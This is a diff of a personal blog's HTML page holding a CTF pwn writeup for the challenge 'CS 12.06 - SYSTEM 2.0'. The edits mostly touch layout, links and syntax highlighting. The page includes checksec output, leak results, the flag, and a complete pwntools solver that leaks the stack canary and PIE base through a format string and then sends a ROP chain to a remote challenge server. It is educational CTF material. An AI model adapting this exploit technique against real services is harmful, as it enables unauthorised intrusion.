@@ -1,17 +1,17 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#0b0b0e"><title>CS 12.06 - SYSTEM 2.0 · Pwn writeup — r3t0x</title><meta name="description" content="XIIVI ONCE SAID &quot;IINEK DIMA AL HOLILA&quot;…"><link rel="canonical" href="https://ghaith-amdouni.github.io/challenge/mojo-jojo/pwn/CS_12.6/"><meta property="og:type" content="article"><meta property="og:title" content="CS 12.06 - SYSTEM 2.0 · Pwn writeup — r3t0x"><meta property="og:description" content="XIIVI ONCE SAID &quot;IINEK DIMA AL HOLILA&quot;…"><meta property="og:url" content="https://ghaith-amdouni.github.io/challenge/mojo-jojo/pwn/CS_12.6/"><meta property="og:image" content="https://ghaith-amdouni.github.io/static/img/social-card.png"><meta name="twitter:card" content="summary_large_image"><link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml"><link rel="alternate" type="application/rss+xml" title="r3t0x journal" href="/feed.xml"><link rel="stylesheet" href="/static/css/site.css?v=c3965b3600e8"><link rel="stylesheet" href="/static/css/akatsuki.css?v=c3965b3600e8"><script src="/static/js/site.js?v=c3965b3600e8" defer></script></head><body class="veil-open">
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#0b0b0e"><title>CS 12.06 - SYSTEM 2.0 · Pwn writeup — r3t0x</title><meta name="description" content="XIIVI ONCE SAID &quot;IINEK DIMA AL HOLILA&quot;…"><link rel="canonical" href="https://ghaith-amdouni.github.io/challenge/mojo-jojo/pwn/CS_12.6/"><meta property="og:type" content="article"><meta property="og:title" content="CS 12.06 - SYSTEM 2.0 · Pwn writeup — r3t0x"><meta property="og:description" content="XIIVI ONCE SAID &quot;IINEK DIMA AL HOLILA&quot;…"><meta property="og:url" content="https://ghaith-amdouni.github.io/challenge/mojo-jojo/pwn/CS_12.6/"><meta property="og:image" content="https://ghaith-amdouni.github.io/static/img/social-card.png"><meta name="twitter:card" content="summary_large_image"><link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml"><link rel="alternate" type="application/rss+xml" title="r3t0x journal" href="/feed.xml"><link rel="stylesheet" href="/static/css/site.css?v=b0b7e08b9fc0"><link rel="stylesheet" href="/static/css/akatsuki.css?v=b0b7e08b9fc0"><script src="/static/js/site.js?v=b0b7e08b9fc0" defer></script></head><body class="veil-open">
   <a class="skip" href="#main">Skip to content</a><div class="reading-progress" aria-hidden="true"></div>
   <div class="systembar"><div><span class="arch-mini" aria-hidden="true">Λ</span> archlinux <span class="bar-sep">/</span> r3t0x@portfolio <span class="system-workspaces" aria-hidden="true"><b>01</b> 02 03</span></div><div><span class="online-dot"></span> ALL SYSTEMS NOMINAL <span class="bar-sep">/</span> <time id="clock">UTC</time></div></div>
   <header class="site-header"><a class="brand" href="/" aria-label="r3t0x home"><img class="brand-eye" src="/static/img/mangekyou.png" alt="" width="32" height="32"><span>r3t0x<span class="muted">@arch</span></span></a><nav aria-label="Main navigation"><a href="/" >~/home</a><a href="/blog/" aria-current="page">~/archive</a><a href="/projects/" >~/projects</a><a href="/static/docs/Ghaith-Amdouni-CV-English.pdf" download>CV ↓</a></nav><button class="search-trigger" data-open-search aria-label="Search site"><span>⌕</span><kbd>Ctrl K</kbd></button></header>
   <div class="archive-transition" id="archive-transition" aria-hidden="true"><div class="route-eyelid route-eyelid-top"></div><div class="route-eyelid route-eyelid-bottom"></div><div class="vault-coordinates"><span>00:00:01</span><span>0x00401337</span></div><div class="vault-eye"><span class="vault-symbol"></span><span class="vault-reticle"></span><i></i><i></i><i></i></div><div class="vault-caption"><p><small>TSUKUYOMI ROUTE SHIFT</small><b id="transition-label">ENTERING THE MEMORY VAULT</b><span id="transition-address">~/archive</span></p></div></div>
   <div class="ambient-clouds" aria-hidden="true"><svg class="akatsuki-cloud" viewBox="0 0 160 100" aria-hidden="true"><path d="M34 78C9 80 6 52 28 47C20 24 47 13 63 28C75 3 112 12 113 37C138 27 158 51 143 69C135 79 119 80 108 76C104 91 81 91 73 79C62 89 42 91 34 78Z"/><path class="cloud-whorl" d="M28 47C52 41 68 52 62 65C57 76 39 72 41 62M113 37C93 36 85 47 90 59"/></svg><svg class="akatsuki-cloud" viewBox="0 0 160 100" aria-hidden="true"><path d="M34 78C9 80 6 52 28 47C20 24 47 13 63 28C75 3 112 12 113 37C138 27 158 51 143 69C135 79 119 80 108 76C104 91 81 91 73 79C62 89 42 91 34 78Z"/><path class="cloud-whorl" d="M28 47C52 41 68 52 62 65C57 76 39 72 41 62M113 37C93 36 85 47 90 59"/></svg></div><div class="scroll-address" aria-hidden="true"><b>RIP</b><span id="scroll-address">0x00000000</span><i><em></em></i><small>PTR</small></div><div class="route-veil" id="route-veil" aria-hidden="true"><div class="veil-lid veil-lid-top"></div><div class="veil-lid veil-lid-bottom"></div><div class="veil-eye"><svg viewBox="0 0 200 200"><defs><clipPath id="veilClip"><circle cx="100" cy="100" r="98"/></clipPath></defs><circle cx="100" cy="100" r="94" fill="var(--red)" stroke="#000" stroke-width="10"/><g class="veil-base"><circle cx="100" cy="100" r="90" fill="var(--red)"/><circle cx="100" cy="100" r="16" fill="#000"/><circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/><g class="veil-tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g><g class="veil-tomoe" style="transform:rotate(120deg)"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g><g class="veil-tomoe" style="transform:rotate(240deg)"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g></g><image class="veil-mangekyo" href="/static/img/mangekyou.png" x="0" y="0" width="200" height="200" clip-path="url(#veilClip)"/></svg></div></div><div class="kamui-veil" id="kamui-veil" aria-hidden="true"></div><main id="main"><article class="wrap article-page writeup-page">
-    <a class="text-link" href="/blog/?collection=MOJO-JOJO%20CTF">← Back to the archive</a>
+    <a class="text-link" href="/blog/?collection=MOJO-JOJO+CTF&amp;category=Pwn">← Back to archive · Pwn</a>
     <header class="article-heading"><p class="eyebrow">MOJO-JOJO CTF <span>/</span> Pwn WRITEUP</p><h1>CS 12.06 - SYSTEM 2.0</h1><p>XIIVI ONCE SAID &quot;IINEK DIMA AL HOLILA&quot;…</p>
       <div class="article-author"><img src="/static/img/ghaith.webp" alt="" width="44" height="44"><span><strong>r3t0x</strong><small>2026-09-28 · archived challenge · medium</small></span><a class="button" href="#solver">Jump to solver ↓</a></div>
     </header>
     <div class="writeup-facts" aria-label="Challenge metadata"><span><small>EVENT</small>MOJO-JOJO CTF</span><span><small>CATEGORY</small>Pwn</span><span><small>DIFFICULTY</small>medium</span><span><small>POINTS</small>Archived</span></div>
     <div class="writeup-tags"><span>Format String + Canary Leak + ROP via Custom Gadgets</span></div>
     <div class="article-layout">
-      <div class="prose writeup-prose"><h2 id="summary">Summary</h2><p class="lead">XIIVI ONCE SAID &quot;IINEK DIMA AL HOLILA&quot;…</p><h2 id="walkthrough">Walkthrough</h2><h3>Reconnaissance</h3>
+      <div class="prose writeup-prose"><h2 id="walkthrough">Walkthrough</h2><h3>Reconnaissance</h3>
 <div class="codehilite"><pre><span></span><code>pwndbg&gt;<span class="w"> </span>checksec<span class="w"> </span>./challenge
 <span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little
 <span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO
@@ -45,43 +45,43 @@
 <div class="codehilite"><pre><span></span><code>[+] Canary recovered: 0xa1b2c3d400000000
 [+] PIE Base found:   0x555555554000
 &gt;&gt;&gt; DATA EXFILTRATED: MOJO-JOJO{f0rm4t_str1ng_t0_r0p_ch41n}
-</code></pre></div><h2 id="solver">Reference solver</h2><p>The complete solver used to validate the challenge:</p><pre><code class="language-python">from pwn import *
+</code></pre></div><h2 id="solver">Reference solver</h2><p>The reference solver supplied with the writeup:</p><pre><code class="language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
 
-context.binary = b = ELF('./challenge', checksec=False)
+context.binary = b = ELF(<span class="hljs-string">&#x27;./challenge&#x27;</span>, checksec=<span class="hljs-literal">False</span>)
 
-def get_io():
-    if args.REMOTE:
-        return remote(args.HOST or '4.233.210.175', int(args.PORT or 9006))
-    return process(b.path)
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_io</span>():
+    <span class="hljs-keyword">if</span> args.REMOTE:
+        <span class="hljs-keyword">return</span> remote(args.HOST <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;4.233.210.175&#x27;</span>, <span class="hljs-built_in">int</span>(args.PORT <span class="hljs-keyword">or</span> <span class="hljs-number">9006</span>))
+    <span class="hljs-keyword">return</span> process(b.path)
 
-# Single connection for Leak + Exploit (Canary is process-specific)
+<span class="hljs-comment"># Single connection for Leak + Exploit (Canary is process-specific)</span>
 io = get_io()
 
-# Leak Canary (17) and PIE (19)
-io.sendlineafter(b&quot;required: &quot;, b&quot;%17$p.%19$p&quot;)
-io.recvuntil(b&quot;confirmed: &quot;)
-leaks = io.recvline().strip().decode().split('.')
-canary = int(leaks[0], 16)
-pie = int(leaks[1], 16)
+<span class="hljs-comment"># Leak Canary (17) and PIE (19)</span>
+io.sendlineafter(<span class="hljs-string">b&quot;required: &quot;</span>, <span class="hljs-string">b&quot;%17$p.%19$p&quot;</span>)
+io.recvuntil(<span class="hljs-string">b&quot;confirmed: &quot;</span>)
+leaks = io.recvline().strip().decode().split(<span class="hljs-string">&#x27;.&#x27;</span>)
+canary = <span class="hljs-built_in">int</span>(leaks[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>)
+pie = <span class="hljs-built_in">int</span>(leaks[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)
 
-b.address = pie - 0x162c
-success(f&quot;Canary recovered: {hex(canary)}&quot;)
-success(f&quot;PIE Base found:   {hex(b.address)}&quot;)
+b.address = pie - <span class="hljs-number">0x162c</span>
+success(<span class="hljs-string">f&quot;Canary recovered: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(canary)}</span>&quot;</span>)
+success(<span class="hljs-string">f&quot;PIE Base found:   <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(b.address)}</span>&quot;</span>)
 
-# Proceed to _auth_guard overflow in the same session
+<span class="hljs-comment"># Proceed to _auth_guard overflow in the same session</span>
 payload = flat([
-    b&quot;A&quot;*40, canary, b&quot;B&quot;*8,
-    b.address + 0x1498, # ret
-    b.address + 0x1482, # gadget 1 (_proc_ctx_1)
-    0x1337, 1, 0x1206, 0x1161, 0xcafebab,
-    b.address + 0x40b0, # k_dispatch_table
-    b.address + 0x149b  # gadget 2 (_proc_ctx_2)
+    <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">40</span>, canary, <span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">8</span>,
+    b.address + <span class="hljs-number">0x1498</span>, <span class="hljs-comment"># ret</span>
+    b.address + <span class="hljs-number">0x1482</span>, <span class="hljs-comment"># gadget 1 (_proc_ctx_1)</span>
+    <span class="hljs-number">0x1337</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0x1206</span>, <span class="hljs-number">0x1161</span>, <span class="hljs-number">0xcafebab</span>,
+    b.address + <span class="hljs-number">0x40b0</span>, <span class="hljs-comment"># k_dispatch_table</span>
+    b.address + <span class="hljs-number">0x149b</span>  <span class="hljs-comment"># gadget 2 (_proc_ctx_2)</span>
 ])
 
-io.sendafter(b&quot;: &quot;, payload)
-print(io.recvall(timeout=5).decode('utf-8', 'replace'))
+io.sendafter(<span class="hljs-string">b&quot;: &quot;</span>, payload)
+<span class="hljs-built_in">print</span>(io.recvall(timeout=<span class="hljs-number">5</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;replace&#x27;</span>))
 io.close()</code></pre><h2 id="flag">Flag</h2><pre class="flag-output"><code>MOJO-JOJO{f0rm4t_str1ng_t0_r0p_ch41n}</code></pre>
-      <div class="article-end"><span>Published 2026-09-28 · by r3t0x</span><a class="text-link" href="/blog/?collection=MOJO-JOJO%20CTF">More MOJO-JOJO CTF writeups ↗</a></div></div>
+      <div class="article-end"><span>Published 2026-09-28 · by r3t0x</span><a class="text-link" href="/blog/?collection=MOJO-JOJO+CTF&amp;category=Pwn">← Back to archive · Pwn</a></div></div>
     </div>
   </article></main>
   <footer class="site-footer"><div class="footer-top"><a class="brand" href="/"><img class="brand-eye" src="/static/img/mangekyou.png" alt="" width="32" height="32"><span>r3t0x<span class="muted">@arch</span></span></a><p>Always curious. Always one layer deeper.</p><a href="#main" class="text-link">Back to top ↑</a></div><div class="footer-bottom"><span>© 2026 Ghaith Amdouni <span class="red">·</span> Made with curiosity & caffeine.</span><div><a href="/projects/">Projects ↗</a><a href="https://github.com/Ghaith-amdouni">GitHub ↗</a><a href="https://www.linkedin.com/in/amdouni-ghaith">LinkedIn ↗</a><a href="/static/docs/Ghaith-Amdouni-CV-English.pdf" download>Résumé ↗</a><a href="/feed.xml">RSS ↗</a><button id="motion-toggle" aria-pressed="false">Motion: on</button></div></div></footer>
